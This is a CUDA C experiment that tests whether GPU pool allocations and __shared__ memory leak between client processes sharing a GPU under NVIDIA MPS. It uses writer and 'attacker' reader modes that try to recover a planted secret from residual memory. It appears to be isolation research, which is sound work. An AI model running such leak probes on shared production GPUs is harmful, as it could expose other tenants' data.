/*
 * Experiment 25: CUDA MPS (Multi-Process Service) Pool Isolation Test
 *
 * CUDA MPS merges multiple client processes into a single CUDA context,
 * sharing the same GPU address space. This is used on cloud GPUs (A100/H100)
 * to increase GPU utilization across multiple workloads.
 *
 * Without MPS: each process has its own CUDA context → pool isolated.
 * With MPS:    all processes share ONE context → same pool? same __shared__?
 *
 * This test runs as a CLIENT process under an MPS server.
 * The MPS server must be started separately:
 *   sudo nvidia-smi -c 3   (EXCLUSIVE_PROCESS mode)
 *   nvidia-cuda-mps-control -d
 *
 * Tests:
 *   A. Under MPS: does this client's pool leak to next client?
 *      (Run: mps_pool_leak write, then mps_pool_leak read in same MPS session)
 *   B. MPS shared memory: does __shared__ persist across MPS clients?
 *   C. MPS context: can client A see client B's pool allocations?
 *
 * This binary is a single writer or reader depending on argv[1]:
 *   ./mps_pool_leak write <secret> <handle_file>
 *   ./mps_pool_leak read  <handle_file>
 *   ./mps_pool_leak shm_write <secret>
 *   ./mps_pool_leak shm_read
 */

#include <cuda_runtime.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define CHECK(call) do { cudaError_t _e=(call); if(_e!=cudaSuccess){ \
    fprintf(stderr,"[RT] %s:%d %s\n",__FILE__,__LINE__,cudaGetErrorString(_e)); exit(1); } } while(0)

#define N (256 * 1024)  /* 1 MB of floats */

__global__ void fill_pool(float *buf, float val, int n) {
    int i = blockIdx.x * blockDim.x + threadIdx.x;
    if (i < n) buf[i] = val;
}

__global__ void victim_shm(float secret, int *flag) {
    __shared__ float sm[N > 12288 ? 12288 : N];
    int tid = threadIdx.x, stride = blockDim.x;
    const int SM_N = 12288;
    for (int i = tid; i < SM_N; i += stride)
        sm[i] = secret;
    __syncthreads();
    if (tid == 0 && sm[0] != 0.0f) atomicAdd(flag, 1);
}

__global__ void attacker_shm(float *out, int n) {
    __shared__ float sm[12288];
    int tid = threadIdx.x, stride = blockDim.x;
    __syncthreads();
    for (int i = tid; i < n && i < 12288; i += stride)
        out[i] = sm[i];
}

static int count_match(const float *buf, float val, int n) {
    int c = 0; for (int i = 0; i < n; i++) if (fabsf(buf[i]-val)<1e-3f) c++; return c;
}

/* ---- WRITE mode: allocate via pool, fill with secret, write IPC handle ---- */
static void mode_write(float secret, const char *hfile) {
    printf("[MPS WRITER] device=0 secret=%.5f\n", secret);
    CHECK(cudaSetDevice(0));

    /* Pool alloc (torch-style) */
    cudaStream_t s;
    CHECK(cudaStreamCreate(&s));
    float *d_pool = NULL;
    CHECK(cudaMallocAsync(&d_pool, N * sizeof(float), s));
    fill_pool<<<(N+255)/256, 256, 0, s>>>(d_pool, secret, N);
    CHECK(cudaStreamSynchronize(s));
    /* "Free" to pool — stays in physical memory */
    CHECK(cudaFreeAsync(d_pool, s));
    CHECK(cudaStreamSynchronize(s));
    printf("[MPS WRITER] Pool alloc filled with SECRET, freed to pool.\n");

    /* Regular cudaMalloc — does pool residue appear here? */
    float *d_ipc = NULL;
    CHECK(cudaMalloc(&d_ipc, N * sizeof(float)));

    float *h = (float*)malloc(N * sizeof(float));
    CHECK(cudaMemcpy(h, d_ipc, N * sizeof(float), cudaMemcpyDeviceToHost));
    int self_match = count_match(h, secret, N);
    printf("[MPS WRITER] Self-check cudaMalloc: %d/%d match\n", self_match, N);
    free(h);

    /* Export IPC handle */
    cudaIpcMemHandle_t handle;
    CHECK(cudaIpcGetMemHandle(&handle, d_ipc));
    FILE *f = fopen(hfile, "wb");
    if (!f) { perror("fopen"); exit(1); }
    int n_out = N;
    fwrite(&handle, sizeof(handle), 1, f);
    fwrite(&n_out, sizeof(int), 1, f);
    fwrite(&secret, sizeof(float), 1, f);
    fclose(f);
    printf("[MPS WRITER] IPC handle written to %s\n", hfile);
    printf("[MPS WRITER] Sleeping 15 sec...\n"); fflush(stdout);
    sleep(15);
    CHECK(cudaFree(d_ipc));
    CHECK(cudaStreamDestroy(s));
    printf("[MPS WRITER] Done.\n");
}

/* ---- READ mode: open IPC handle, check for secret ---- */
static void mode_read(const char *hfile) {
    printf("[MPS READER] Opening IPC handle from %s\n", hfile);
    CHECK(cudaSetDevice(0));

    FILE *f = fopen(hfile, "rb");
    if (!f) { perror("fopen"); exit(1); }
    cudaIpcMemHandle_t handle;
    int n; float secret;
    (void)fread(&handle, sizeof(handle), 1, f);
    (void)fread(&n, sizeof(n), 1, f);
    (void)fread(&secret, sizeof(secret), 1, f);
    fclose(f);

    float *d_ipc = NULL;
    cudaError_t err = cudaIpcOpenMemHandle((void**)&d_ipc, handle,
                                            cudaIpcMemLazyEnablePeerAccess);
    if (err != cudaSuccess) {
        printf("[MPS READER] cudaIpcOpenMemHandle: %s\n", cudaGetErrorString(err));
        printf("NOTE: Under MPS, all clients share the same context — IPC may\n");
        printf("      fail because memory is already mapped in the same context.\n");
        return;
    }
    float *h = (float*)malloc(n * sizeof(float));
    CHECK(cudaMemcpy(h, d_ipc, n * sizeof(float), cudaMemcpyDeviceToHost));
    int m = count_match(h, secret, n);
    printf("[MPS READER] IPC read: %d/%d match (secret=%.5f)\n", m, n, secret);

    /* Also test pool alloc: does reader's pool have writer's data? */
    cudaStream_t sr;
    CHECK(cudaStreamCreate(&sr));
    float *d_pool = NULL;
    CHECK(cudaMallocAsync(&d_pool, n * sizeof(float), sr));
    CHECK(cudaStreamSynchronize(sr));
    CHECK(cudaMemcpy(h, d_pool, n * sizeof(float), cudaMemcpyDeviceToHost));
    int pool_match = count_match(h, secret, n);
    printf("[MPS READER] Reader pool alloc: %d/%d match (cross-process pool contamination?)\n",
           pool_match, n);
    if (pool_match == n)
        printf("[!!!] MPS POOL LEAK: reader's pool alloc contains writer's data!\n");
    else
        printf("SAFE: reader's pool does not contain writer's pool data.\n");

    free(h);
    CHECK(cudaIpcCloseMemHandle(d_ipc));
    CHECK(cudaFreeAsync(d_pool, sr));
    CHECK(cudaStreamDestroy(sr));
    printf("[MPS READER] Done.\n");
}

/* ---- SHM_WRITE: fill shared memory via kernel, sleep ---- */
static void mode_shm_write(float secret) {
    printf("[MPS SHM WRITER] Filling __shared__ with %.5f\n", secret);
    CHECK(cudaSetDevice(0));
    int *d_flag;
    CHECK(cudaMalloc(&d_flag, sizeof(int)));
    CHECK(cudaMemset(d_flag, 0, sizeof(int)));
    /* Use many blocks to fill all 132 SMs */
    victim_shm<<<512, 256>>>(secret, d_flag);
    CHECK(cudaDeviceSynchronize());
    int h_flag = 0;
    CHECK(cudaMemcpy(&h_flag, d_flag, sizeof(int), cudaMemcpyDeviceToHost));
    printf("[MPS SHM WRITER] flag=%d (victim wrote __shared__). Sleeping 10 sec...\n", h_flag);
    fflush(stdout);
    sleep(10);
    CHECK(cudaFree(d_flag));
    printf("[MPS SHM WRITER] Done.\n");
}

/* ---- SHM_READ: read uninitialized __shared__ ---- */
static void mode_shm_read(float expected_secret) {
    printf("[MPS SHM READER] Reading __shared__ without init (expected=%.5f)\n", expected_secret);
    CHECK(cudaSetDevice(0));
    const int SM_N = 12288;
    float *d_out, *h_out;
    CHECK(cudaMalloc(&d_out, SM_N * sizeof(float)));
    h_out = (float*)malloc(SM_N * sizeof(float));

    attacker_shm<<<512, 256>>>(d_out, SM_N);
    CHECK(cudaDeviceSynchronize());
    CHECK(cudaMemcpy(h_out, d_out, SM_N * sizeof(float), cudaMemcpyDeviceToHost));

    int m = count_match(h_out, expected_secret, SM_N);
    int nz = 0; for (int i = 0; i < SM_N; i++) if (h_out[i] != 0.0f) nz++;
    printf("[MPS SHM READER] match=%d/%d  nonzero=%d/%d\n", m, SM_N, nz, SM_N);
    if (m == SM_N)
        printf("[!!!] MPS __shared__ LEAK: reader sees writer's shared memory data!\n");
    else if (m > SM_N/4)
        printf("[~] PARTIAL shared memory leak under MPS\n");
    else
        printf("SAFE: shared memory isolated between MPS clients.\n");

    free(h_out); CHECK(cudaFree(d_out));
    printf("[MPS SHM READER] Done.\n");
}

int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr,
            "Usage:\n"
            "  %s write <secret_float> <handle_file>   — pool write + IPC export\n"
            "  %s read <handle_file> <secret_float>    — IPC read + pool check\n"
            "  %s shm_write <secret_float>             — fill __shared__\n"
            "  %s shm_read <expected_secret>           — read __shared__\n",
            argv[0], argv[0], argv[0], argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "write") == 0 && argc >= 4)
        mode_write(atof(argv[2]), argv[3]);
    else if (strcmp(argv[1], "read") == 0 && argc >= 4)
        mode_read(argv[2]);
    else if (strcmp(argv[1], "shm_write") == 0 && argc >= 3)
        mode_shm_write(atof(argv[2]));
    else if (strcmp(argv[1], "shm_read") == 0 && argc >= 3)
        mode_shm_read(atof(argv[2]));
    else {
        fprintf(stderr, "Unknown mode or missing args.\n");
        return 1;
    }
    return 0;
}
